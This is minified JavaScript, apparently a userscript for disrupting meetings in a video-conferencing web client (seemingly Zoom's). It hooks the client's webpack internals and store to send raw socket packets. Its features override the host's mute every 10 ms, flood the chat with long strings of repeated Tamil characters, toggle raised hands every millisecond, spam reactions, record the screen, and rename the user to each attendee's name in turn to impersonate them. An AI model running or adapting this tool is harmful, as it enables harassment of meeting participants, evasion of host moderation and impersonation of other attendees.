( () => {
    "use strict";
    const e = function e(t, n) {
        var r;
        function o(e) {
            var t = document.createElement("div");
            if (t.style.position = "fixed",
            t.style.width = "380px",
            t.style.height = "auto", 
            t.style.maxHeight = "80vh",
            t.style.overflowY = "auto",
            t.style.overflowX = "hidden",
            t.style.border = "none",
            t.style.backgroundColor = "rgba(18, 18, 20, 0.95)",
            t.style.backdropFilter = "blur(10px)",
            t.style.color = "#FFF",
            t.style.padding = "25px",
            t.style.boxShadow = "0 8px 32px rgba(0, 0, 0, 0.4)",
            t.style.borderRadius = "16px",
            t.style.zIndex = "999999",
            t.style.left = "100px",
            t.style.top = "100px",
            t.style.userSelect = "none",
            t.style.fontFamily = "system-ui, -apple-system, sans-serif",
            t.style.scrollbarWidth = "thin",
            t.style.scrollbarColor = "rgba(255,255,255,0.3) rgba(0,0,0,0)",
            document.body.appendChild(t),
            n) {
                var r = document.createElement("img");
                r.src = n,
                r.style.width = "auto",
                r.style.height = "36px",
                r.style.maxHeight = "100px",
                r.style.objectFit = "contain",
                r.style.margin = "0 auto 20px",
                r.style.display = "block",
                t.appendChild(r)
            }
            return e && (t.header = document.createElement("h2"),
            t.header.style.margin = "0 0 20px 0",
            t.header.style.textAlign = "center",
            t.header.style.fontSize = "20px",
            t.header.style.color = "white",
            t.header.style.fontWeight = "600",
            t.header.style.letterSpacing = "0.5px",
            t.header.style.fontFamily = "system-ui, -apple-system, sans-serif",
            t.header.textContent = e,
            t.appendChild(t.header),
            
            // Добавляем версию под заголовком
            t.version = document.createElement("div"),
            t.version.textContent = "🌈 Ultimate версия",
            t.version.style.textAlign = "center",
            t.version.style.fontSize = "14px",
            t.version.style.color = "rgba(255,255,255,0.7)",
            t.version.style.marginTop = "-15px",
            t.version.style.marginBottom = "20px",
            t.appendChild(t.version)),
            t
        }
        e.addHtml = function(e, t) {
            e.insertAdjacentHTML("beforeend", t)
        }
        ,
        e.addSubtitle = function(e, t) {
            var n = document.createElement("h3");
            n.innerHTML = t,
            n.style.color = "rgba(255, 255, 255, 0.6)",
            n.style.textShadow = "none",
            n.style.margin = "16px 0 8px 0",
            n.style.textAlign = "left",
            n.style.fontFamily = "system-ui, -apple-system, sans-serif",
            n.style.fontSize = "12px",
            n.style.fontWeight = "500",
            n.style.letterSpacing = "0.5px",
            n.style.textTransform = "uppercase",
            n.style.opacity = "0.8",
            n.style.paddingLeft = "4px",
            e.appendChild(n)
        }
        ;
        var a = o(t);
        a.settingsOpen = !1,
        e.addButton = function(t, n, r, i, l) {
            var c = arguments.length > 5 && void 0 !== arguments[5] && arguments[5]
              , s = "rgba(45, 45, 48, 0.95)"
              , u = "rgba(35, 35, 38, 0.95)"
              , d = document.createElement("button");
            if (d.textContent = n,
            d.className = "button",
            d.style.padding = "10px 20px",
            d.style.width = "100%",
            d.style.border = "1px solid rgba(255,255,255,0.1)",
            d.style.borderRadius = "8px",
            d.style.cursor = "pointer",
            d.style.margin = "6px 0",
            d.style.color = "white",
            d.style.transition = "all 0.2s ease",
            d.style.fontFamily = "system-ui, -apple-system, sans-serif",
            d.style.fontSize = "13px",
            d.style.fontWeight = "500",
            d.style.letterSpacing = "0.3px",
            d.style.textTransform = "uppercase",
            d.style.position = "relative",
            d.style.overflow = "hidden",
            n.includes("TELEGRAM")) {
                d.style.background = "linear-gradient(45deg, rgba(45, 45, 48, 0.95), rgba(29, 161, 242, 0.3))";
                d.style.boxShadow = "0 0 15px rgba(29, 161, 242, 0.3)"
            } else {
                var p = c;
                d.style.backgroundColor = p ? u : s,
                d.style.boxShadow = "none"
            }
            d.addEventListener("mouseover", (function() {
                d.style.backgroundColor = "rgba(55, 55, 58, 0.95)",
                d.style.transform = "translateY(-1px)"
            }
            )),
            d.addEventListener("mouseleave", (function() {
                setTimeout((function() {
                    d.style.transform = "translateY(0)",
                    d.style.backgroundColor = n.includes("TELEGRAM") ? "linear-gradient(45deg, rgba(45, 45, 48, 0.95), rgba(29, 161, 242, 0.3))" : p ? u : s
                }
                ), 100)
            }
            )),
            d.addEventListener("click", (function() {
                d.style.transform = "scale(0.95)";
                d.style.transition = "transform 0.1s ease";
                
                setTimeout(() => {
                    d.style.transform = "scale(1)";
                }, 100);

                if(r) {
                    if(p) {
                        d.style.backgroundColor = s;
                        p = !1;
                        l();
                    } else {
                        d.style.backgroundColor = u;
                        p = !0;
                        i();
                    }
                } else {
                    d.style.backgroundColor = u;
                    i();
                    setTimeout((function() {
                        d.style.backgroundColor = n.includes("TELEGRAM") ? "linear-gradient(45deg, rgba(45, 45, 48, 0.95), rgba(29, 161, 242, 0.3))" : s
                    }), 100);
                }

                // Добавляем эффект пульсации
                const ripple = document.createElement('span');
                ripple.style.position = 'absolute';
                ripple.style.background = 'rgba(255,255,255,0.3)';
                ripple.style.borderRadius = '50%';
                ripple.style.transform = 'scale(0)';
                ripple.style.animation = 'ripple 0.6s linear';
                ripple.style.pointerEvents = 'none';

                const rect = d.getBoundingClientRect();
                const size = Math.max(rect.width, rect.height);
                ripple.style.width = ripple.style.height = size + 'px';
                ripple.style.left = event.clientX - rect.left - size/2 + 'px';
                ripple.style.top = event.clientY - rect.top - size/2 + 'px';

                d.appendChild(ripple);
                setTimeout(() => ripple.remove(), 600);
            }
            ));

            const style = document.createElement('style');
            style.textContent = `
                @keyframes ripple {
                    to {
                        transform: scale(4);
                        opacity: 0;
                    }
                }
            `;
            document.head.appendChild(style);

            var h = [];
            return d.oncontextmenu = function(t) {
                if (0 == h.length)
                    return !1;
                if (1 == a.settingsOpen)
                    return !1;
                var n = o();
                return n.style.left = parseInt(a.style.left) + parseInt(a.style.width) + 5 + "px",
                n.style.top = a.style.top,
                a.settingsOpen = !0,
                h.forEach((function(t) {
                    e.addButton(n, null == t ? void 0 : t.title, null == t ? void 0 : t.toggle, (function() {
                        t.enable(),
                        t.enabled = !0
                    }
                    ), (function() {
                        t.disable(),
                        t.enabled = !1
                    }
                    ), null == t ? void 0 : t.enabled)
                }
                )),
                n.addEventListener("mouseleave", (function() {
                    setTimeout((function() {
                        n.remove(),
                        a.settingsOpen = !1
                    }
                    ), 100)
                }
                )),
                !1
            }
            ,
            t.appendChild(d),
            h
        }
        ,
        e.addSeparator = function(e) {
            var t = document.createElement("hr");
            t.style.border = "none",
            t.style.borderTop = "1px solid #EEE",
            t.style.margin = "8px 0",
            e.appendChild(t)
        }
        ;
        var i = !1
          , l = {
            x: 0,
            y: 0
        };
        if (null != a && a.header) {
            a.addEventListener("mousedown", (function(e) {
                i = !0,
                l.x = e.clientX - a.getBoundingClientRect().left,
                l.y = e.clientY - a.getBoundingClientRect().top,
                a.header.style.cursor = "grabbing"
            }
            )),
            document.addEventListener("mousemove", (function(e) {
                i && (a.style.left = "".concat(e.clientX - l.x, "px"),
                a.style.top = "".concat(e.clientY - l.y, "px"))
            }
            )),
            document.addEventListener("mouseup", (function() {
                i = !1,
                a.header.style.cursor = "grab"
            }
            ));
            var c = function(e) {
                "ShiftRight" === e.code && ("block" == a.style.display ? a.style.display = "none" : a.style.display = "block")
            };
            return window.addEventListener("keydown", c),
            null === (r = document.querySelector("#webclient")) || void 0 === r || r.contentWindow.addEventListener("keydown", c),
            a
        }
    };
    var t = {
        _sendSocketMessage: null,
        _sendChatPacket: null,
        _wpRequire: null,
        get frame() {
            var e;
            return (null === (e = document.getElementById("webclient")) || void 0 === e ? void 0 : e.contentWindow) || window
        },
        get store() {
            return Object.values(t.frame.document.querySelector("#root"))[0].memoizedState.element.props.store
        },
        get state() {
            return t.store.getState()
        },
        get packets() {
            return Object.values(t.wpRequire.c).find((function(e) {
                var t;
                return null === (t = e.exports) || void 0 === t ? void 0 : t.WS_CONF_RENAME_REQ
            }
            )).exports
        },
        get morePackets() {
            return Object.values(t.wpRequire.c).find((function(e) {
                var t;
                return null === (t = e.exports) || void 0 === t ? void 0 : t.USER_NODE_AUDIO_STATUS_LIST
            }
            )).exports
        },
        get sendSocketMessage() {
            var e = this;
            return this._sendSocketMessage || Object.values(t.wpRequire.c).forEach((function(t) {
                null != t && t.exports && Object.values(t.exports).forEach((function(t) {
                    "function" == typeof t && t.toString().includes("case a.WS_AUDIO_DIALOUT_REQ:") && (e._sendSocketMessage = t)
                }
                ))
            }
            )),
            this._sendSocketMessage
        },
        get sendChatPacket() {
            var e = this;
            return this._sendChatPacket || Object.values(t.wpRequire.c).forEach((function(t) {
                null != t && t.exports && Object.values(t.exports).forEach((function(t) {
                    if ("function" == typeof t) {
                        var n = t.toString();
                        n.includes("{meeting:{currentUser:") && n.includes("localXmppMsgId") && (e._sendChatPacket = t)
                    }
                }
                ))
            }
            )),
            this._sendChatPacket
        },
        get wpRequire() {
            return this._wpRequire || (t.frame.webpackChunkwebclient = t.frame.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                t.frame.Object.prototype.__defineGetter__(Symbol.for("cache"), (function() {
                    return e.c = this,
                    delete t.frame.Object.prototype[Symbol.for("cache")],
                    {
                        exports: {}
                    }
                }
                )),
                e(Symbol.for("cache")),
                t._wpRequire = e
            }
            ]),
            this._wpRequire
        },
        recache: function() {
            this._wpRequire = null,
            this._sendSocketMessage = null,
            this._sendChatPacket = null
        }
    };
    window.core = t;
    const n = t
      , r = function(e) {
        n.sendSocketMessage({
            evt: n.packets.WS_CONF_RENAME_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                dn2: btoa(unescape(encodeURIComponent(e))),
                olddn2: btoa(unescape(encodeURIComponent(n.state.meeting.currentUser.displayName)))
            }
        })()
    }
      , o = function() {
        n.sendSocketMessage({
            evt: n.morePackets.USER_NODE_AUDIO_STATUS_LIST,
            body: {
                add: null,
                remove: null,
                update: [{
                    id: n.state.meeting.currentUser.userId,
                    muted: !1
                }]
            }
        })(),
        n.sendSocketMessage({
            evt: n.packets.WS_AUDIO_MUTE_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                bMute: !1
            }
        })()
    }
      , a = function() {
        n.sendSocketMessage({
            evt: n.packets.WS_CONF_RAISE_LOWER_HAND_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                bOn: !0
            }
        })((function() {}
        ))
    }
      , i = function() {
        n.sendSocketMessage({
            evt: n.packets.WS_CONF_RAISE_LOWER_HAND_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                bOn: !1
            }
        })((function() {}
        ))
    }
      , l = function(e) {
        n.sendSocketMessage({
            evt: n.packets.WS_CONF_SEND_REACTION_REQ,
            body: {
                uNodeID: n.state.meeting.currentUser.userId,
                strEmojiContent: e
            }
        })()
    }
      , c = function(e) {
        n.sendChatPacket({
            text: e,
            styleItems: [],
            mention: []
        }, 0)(n.store.dispatch, n.store.getState)
    };
    function s() {
        s.autoUnmuteInterval = setInterval((function() {
            n.state.meeting.currentUser.muted && o()
        }
        ), 10)
    }
    s.autoUnmuteInterval = null,
    s.stop = function() {
        return clearInterval(s.autoUnmuteInterval)
    }
    ;
    const u = s;
    var d = 0;
    function p() {
        p.isActive = !0;
        var e = function() {
            p.isActive && (c("ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌௌ ௌௌௌௌௌௌௌ ௌ"),
            setTimeout(e, 0))
        };
        e()
    }
    p.isActive = !1,
    p.stop = function() {
        p.isActive = !1
    }
    ;
    const h = p;
    function m() {
        m.handSpammerInterval = setInterval((function() {
            a(),
            i()
        }
        ), 1)
    }
    m.handSpammerInterval = null,
    m.stop = function() {
        return clearInterval(m.handSpammerInterval)
    }
    ;
    const f = m;
    function y(e, t) {
        (null == t || t > e.length) && (t = e.length);
        for (var n = 0, r = Array(t); n < t; n++)
            r[n] = e[n];
        return r
    }
    function v() {
        v.nameSpammerInterval && clearInterval(v.nameSpammerInterval);
        var e = n.state.attendeesList.attendeesList.map((function(e) {
            return e.displayName
        }
        ))
          , t = 0;
        v.nameSpammerInterval = setInterval((function() {
            if (0 !== e.length) {
                var o = e[t]
                  , a = o.includes(" ") ? o : encodeURIComponent(o);
                if (a)
                    try {
                        r(a)
                    } catch (e) {
                        console.warn("Skipping user: ".concat(o, " - Error: ").concat(e.message))
                    }
                t = (t + 1) % e.length;
                var i = n.state.attendeesList.attendeesList.map((function(e) {
                    return e.displayName
                }
                ));
                i.length !== e.length && e.splice.apply(e, [0, e.length].concat(function(e) {
                    if (Array.isArray(e))
                        return y(e)
                }(l = i) || function(e) {
                    if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"])
                        return Array.from(e)
                }(l) || function(e, t) {
                    if (e) {
                        if ("string" == typeof e)
                            return y(e, t);
                        var n = {}.toString.call(e).slice(8, -1);
                        return "Object" === n && e.constructor && (n = e.constructor.name),
                        "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? y(e, t) : void 0
                    }
                }(l) || function() {
                    throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                }()))
            }
            var l
        }
        ), 1)
    }
    v.nameSpammerInterval = null,
    v.stop = function() {
        return clearInterval(v.nameSpammerInterval)
    }
    ;
    const g = v;
    function b() {
        b.reactionSpammerInterval && clearInterval(b.reactionSpammerInterval),
        b.reactionSpammerInterval = setInterval((function() {
            b.currentEmojiIndex == window.reactionList.length - 1 ? b.currentEmojiIndex = 0 : b.currentEmojiIndex++,
            l(window.reactionList[b.currentEmojiIndex])
        }
        ), b.reactionSpammerDelay)
    }
    b.reactionSpammerDelay = 1,
    b.reactionSpammerInterval = null,
    b.currentEmojiIndex = 0,
    b.stop = function() {
        return clearInterval(b.reactionSpammerInterval)
    }
    ;
    const w = b;
    function S(e) {
        return S = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        }
        : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }
        ,
        S(e)
    }
    function E() {
        E = function() {
            return t
        }
        ;
        var e, t = {}, n = Object.prototype, r = n.hasOwnProperty, o = Object.defineProperty || function(e, t, n) {
            e[t] = n.value
        }
        , a = "function" == typeof Symbol ? Symbol : {}, i = a.iterator || "@@iterator", l = a.asyncIterator || "@@asyncIterator", c = a.toStringTag || "@@toStringTag";
        function s(e, t, n) {
            return Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }),
            e[t]
        }
        try {
            s({}, "")
        } catch (e) {
            s = function(e, t, n) {
                return e[t] = n
            }
        }
        function u(e, t, n) {
            var a = t && t.prototype instanceof v ? t : v
              , i = Object.create(a.prototype)
              , l = new A(r || []);
            return o(i, "_invoke", {
                value: k(e, n, l)
            }),
            i
        }
        function d(e, t, n) {
            try {
                return {
                    type: "normal",
                    arg: e.call(t, n)
                }
            } catch (e) {
                return {
                    type: "throw",
                    arg: e
                }
            }
        }
        t.wrap = u;
        var p = "suspendedStart"
          , h = "suspendedYield"
          , m = "executing"
          , f = "completed"
          , y = {};
        function v() {}
        function g() {}
        function b() {}
        var w = {};
        s(w, i, (function() {
            return this
        }
        ));
        var x = Object.getPrototypeOf
          , I = x && x(x(M([])));
        I && I !== n && r.call(I, i) && (w = I);
        var L = b.prototype = v.prototype = Object.create(w);
        function C(e) {
            ["next", "throw", "return"].forEach((function(t) {
                s(e, t, (function(e) {
                    return this._invoke(t, e)
                }
                ))
            }
            ))
        }
        function R(e, t) {
            function n(o, a, i, l) {
                var c = d(e[o], e, a);
                if ("throw" !== c.type) {
                    var s = c.arg
                      , u = s.value;
                    return u && "object" == S(u) && r.call(u, "__await") ? t.resolve(u.__await).then((function(e) {
                        n("next", e, i, l)
                    }
                    ), (function(e) {
                        n("throw", e, i, l)
                    }
                    )) : t.resolve(u).then((function(e) {
                        s.value = e,
                        i(s)
                    }
                    ), (function(e) {
                        return n("throw", e, i, l)
                    }
                    ))
                }
                l(c.arg)
            }
            var a;
            o(this, "_invoke", {
                value: function(e, r) {
                    function o() {
                        return new t((function(t, o) {
                            n(e, r, t, o)
                        }
                        ))
                    }
                    return a = a ? a.then(o, o) : o()
                }
            })
        }
        function k(t, n, r) {
            var o = p;
            return function(a, i) {
                if (o === m)
                    throw Error("Generator is already running");
                if (o === f) {
                    if ("throw" === a)
                        throw i;
                    return {
                        value: e,
                        done: !0
                    }
                }
                for (r.method = a,
                r.arg = i; ; ) {
                    var l = r.delegate;
                    if (l) {
                        var c = T(l, r);
                        if (c) {
                            if (c === y)
                                continue;
                            return c
                        }
                    }
                    if ("next" === r.method)
                        r.sent = r._sent = r.arg;
                    else if ("throw" === r.method) {
                        if (o === p)
                            throw o = f,
                            r.arg;
                        r.dispatchException(r.arg)
                    } else
                        "return" === r.method && r.abrupt("return", r.arg);
                    o = m;
                    var s = d(t, n, r);
                    if ("normal" === s.type) {
                        if (o = r.done ? f : h,
                        s.arg === y)
                            continue;
                        return {
                            value: s.arg,
                            done: r.done
                        }
                    }
                    "throw" === s.type && (o = f,
                    r.method = "throw",
                    r.arg = s.arg)
                }
            }
        }
        function T(t, n) {
            var r = n.method
              , o = t.iterator[r];
            if (o === e)
                return n.delegate = null,
                "throw" === r && t.iterator.return && (n.method = "return",
                n.arg = e,
                T(t, n),
                "throw" === n.method) || "return" !== r && (n.method = "next",
                n.arg = e),
                y;
            var a = d(o, t.iterator, n.arg);
            if ("throw" === a.type)
                return n.method = "throw",
                n.arg = a.arg,
                n.delegate = null,
                y;
            var i = a.arg;
            return i ? i.done ? (n[t.resultName] = i.value,
            n.next = t.nextLoc,
            "return" !== n.method && (n.method = "next",
            n.arg = e),
            n.delegate = null,
            y) : i : (n.method = "throw",
            n.arg = new TypeError("iterator result is not an object"),
            n.delegate = null,
            y)
        }
        function O(e) {
            var t = {
                tryLoc: e[0]
            };
            1 in e && (t.catchLoc = e[1]),
            2 in e && (t.finallyLoc = e[2],
            t.afterLoc = e[3]),
            this.tryEntries.push(t)
        }
        function _(e) {
            var t = e.completion || {};
            t.type = "normal",
            delete t.arg,
            e.completion = t
        }
        function A(e) {
            this.tryEntries = [{
                tryLoc: "root"
            }],
            e.forEach(O, this),
            this.reset(!0)
        }
        function M(t) {
            if (t || "" === t) {
                var n = t[i];
                if (n)
                    return n.call(t);
                if ("function" == typeof t.next)
                    return t;
                if (!isNaN(t.length)) {
                    var o = -1
                      , a = function n() {
                        for (; ++o < t.length; )
                            if (r.call(t, o))
                                return n.value = t[o],
                                n.done = !1,
                                n;
                        return n.value = e,
                        n.done = !0,
                        n
                    };
                    return a.next = a
                }
            }
            throw new TypeError(S(t) + " is not iterable")
        }
        return g.prototype = b,
        o(L, "constructor", {
            value: b,
            configurable: !0
        }),
        o(b, "constructor", {
            value: g,
            configurable: !0
        }),
        g.displayName = s(b, c, "GeneratorFunction"),
        t.isGeneratorFunction = function(e) {
            var t = "function" == typeof e && e.constructor;
            return !!t && (t === g || "GeneratorFunction" === (t.displayName || t.name))
        }
        ,
        t.mark = function(e) {
            return Object.setPrototypeOf ? Object.setPrototypeOf(e, b) : (e.__proto__ = b,
            s(e, c, "GeneratorFunction")),
            e.prototype = Object.create(L),
            e
        }
        ,
        t.awrap = function(e) {
            return {
                __await: e
            }
        }
        ,
        C(R.prototype),
        s(R.prototype, l, (function() {
            return this
        }
        )),
        t.AsyncIterator = R,
        t.async = function(e, n, r, o, a) {
            void 0 === a && (a = Promise);
            var i = new R(u(e, n, r, o),a);
            return t.isGeneratorFunction(n) ? i : i.next().then((function(e) {
                return e.done ? e.value : i.next()
            }
            ))
        }
        ,
        C(L),
        s(L, c, "Generator"),
        s(L, i, (function() {
            return this
        }
        )),
        s(L, "toString", (function() {
            return "[object Generator]"
        }
        )),
        t.keys = function(e) {
            var t = Object(e)
              , n = [];
            for (var r in t)
                n.push(r);
            return n.reverse(),
            function e() {
                for (; n.length; ) {
                    var r = n.pop();
                    if (r in t)
                        return e.value = r,
                        e.done = !1,
                        e
                }
                return e.done = !0,
                e
            }
        }
        ,
        t.values = M,
        A.prototype = {
            constructor: A,
            reset: function(t) {
                if (this.prev = 0,
                this.next = 0,
                this.sent = this._sent = e,
                this.done = !1,
                this.delegate = null,
                this.method = "next",
                this.arg = e,
                this.tryEntries.forEach(_),
                !t)
                    for (var n in this)
                        "t" === n.charAt(0) && r.call(this, n) && !isNaN(+n.slice(1)) && (this[n] = e)
            },
            stop: function() {
                this.done = !0;
                var e = this.tryEntries[0].completion;
                if ("throw" === e.type)
                    throw e.arg;
                return this.rval
            },
            dispatchException: function(t) {
                if (this.done)
                    throw t;
                var n = this;
                function o(r, o) {
                    return l.type = "throw",
                    l.arg = t,
                    n.next = r,
                    o && (n.method = "next",
                    n.arg = e),
                    !!o
                }
                for (var a = this.tryEntries.length - 1; a >= 0; --a) {
                    var i = this.tryEntries[a]
                      , l = i.completion;
                    if ("root" === i.tryLoc)
                        return o("end");
                    if (i.tryLoc <= this.prev) {
                        var c = r.call(i, "catchLoc")
                          , s = r.call(i, "finallyLoc");
                        if (c && s) {
                            if (this.prev < i.catchLoc)
                                return o(i.catchLoc, !0);
                            if (this.prev < i.finallyLoc)
                                return o(i.finallyLoc)
                        } else if (c) {
                            if (this.prev < i.catchLoc)
                                return o(i.catchLoc, !0)
                        } else {
                            if (!s)
                                throw Error("try statement without catch or finally");
                            if (this.prev < i.finallyLoc)
                                return o(i.finallyLoc)
                        }
                    }
                }
            },
            abrupt: function(e, t) {
                for (var n = this.tryEntries.length - 1; n >= 0; --n) {
                    var o = this.tryEntries[n];
                    if (o.tryLoc <= this.prev && r.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
                        var a = o;
                        break
                    }
                }
                a && ("break" === e || "continue" === e) && a.tryLoc <= t && t <= a.finallyLoc && (a = null);
                var i = a ? a.completion : {};
                return i.type = e,
                i.arg = t,
                a ? (this.method = "next",
                this.next = a.finallyLoc,
                y) : this.complete(i)
            },
            complete: function(e, t) {
                if ("throw" === e.type)
                    throw e.arg;
                return "break" === e.type || "continue" === e.type ? (this.next = e.arg,
                y) : (this.rval = this.arg = e.arg,
                this.method = "return",
                this.next = "end")
            },
            finish: function(e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                    var n = this.tryEntries[t];
                    if (n.finallyLoc === e)
                        return this.complete(n.completion, n.afterLoc),
                        _(n),
                        y
                }
            },
            catch: function(e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                    var n = this.tryEntries[t];
                    if (n.tryLoc === e) {
                        var r = n.completion;
                        if ("throw" === r.type) {
                            var o = r.arg;
                            _(n)
                        }
                        return o
                    }
                }
                throw Error("illegal catch attempt")
            },
            delegateYield: function(t, n, r) {
                return this.delegate = {
                    iterator: M(t),
                    resultName: n,
                    nextLoc: r
                },
                "next" === this.method && (this.arg = e),
                y
            }
        },
        t
    }
    function x(e, t, n, r, o, a, i) {
        try {
            var l = e[a](i)
              , c = l.value
        } catch (e) {
            return void n(e)
        }
        l.done ? t(c) : Promise.resolve(c).then(r, o)
    }
    var I, L;
    function C() {
        return R.apply(this, arguments)
    }
    function R() {
        var e;
        return e = E().mark((function e() {
            var t;
            return E().wrap((function(e) {
                for (; ; )
                    switch (e.prev = e.next) {
                    case 0:
                        return e.prev = 0,
                        e.next = 3,
                        navigator.mediaDevices.getDisplayMedia({
                            video: !0,
                            audio: !0
                        });
                    case 3:
                        L = e.sent,
                        I = new MediaRecorder(L,{
                            mimeType: "video/webm; codecs=vp9",
                            audioBitsPerSecond: 128e3,
                            videoBitsPerSecond: 25e5
                        }),
                        t = [],
                        I.ondataavailable = function(e) {
                            e.data.size > 0 && t.push(e.data)
                        }
                        ,
                        I.onstop = function() {
                            var e = new Blob(t,{
                                type: "video/webm"
                            })
                              , n = URL.createObjectURL(e)
                              , r = document.createElement("a");
                            r.style.display = "none",
                            r.href = n,
                            r.download = "recorded-video.webm",
                            document.body.appendChild(r),
                            r.click(),
                            document.body.removeChild(r),
                            URL.revokeObjectURL(n)
                        }
                        ,
                        I.start(),
                        e.next = 14;
                        break;
                    case 11:
                        e.prev = 11,
                        e.t0 = e.catch(0),
                        console.error("Error: ", e.t0);
                    case 14:
                    case "end":
                        return e.stop()
                    }
            }
            ), e, null, [[0, 11]])
        }
        )),
        R = function() {
            var t = this
              , n = arguments;
            return new Promise((function(r, o) {
                var a = e.apply(t, n);
                function i(e) {
                    x(a, r, o, i, l, "next", e)
                }
                function l(e) {
                    x(a, r, o, i, l, "throw", e)
                }
                i(void 0)
            }
            ))
        }
        ,
        R.apply(this, arguments)
    }
    C.stop = function() {
        I.stop(),
        L.getTracks().forEach((function(e) {
            return e.stop()
        }
        ))
    }
    ;
    const k = C;
    window.namesList = ["Александр", "Дмитрий", "Максим", "Сергей", "Андрей", "Алексей", "Артём", "Илья", "Кирилл", "Михаил", "Никита", "Матвей", "Роман", "Егор", "Арсений", "Иван", "Денис", "Евгений", "Даниил", "Тимофей", "Владислав", "Игорь", "Владимир", "Павел", "Руслан", "Марк", "Константин", "Тимур", "Олег", "Ярослав", "Антон", "Николай", "Глеб", "Данил", "Савелий", "Вадим", "Степан", "Юрий", "Богдан", "Артур", "Анна", "Мария", "Елена", "Дарья", "Алина", "Ирина", "Екатерина", "Арина", "Полина", "Ольга", "Юлия", "Татьяна", "София", "Наталья", "Виктория", "Марина", "Светлана", "Анастасия", "Валерия", "Ксения", "Василиса", "Вероника", "Милана", "Алиса", "Александра", "Ева", "Софья", "Мирослава", "Варвара", "Диана", "Злата", "Евгения", "Таисия", "Кира", "Вера", "Надежда", "Любовь", "Маргарита", "Лидия", "Галина", "Яна", "Валентина", "Людмила", "Нина", "Эмилия"];
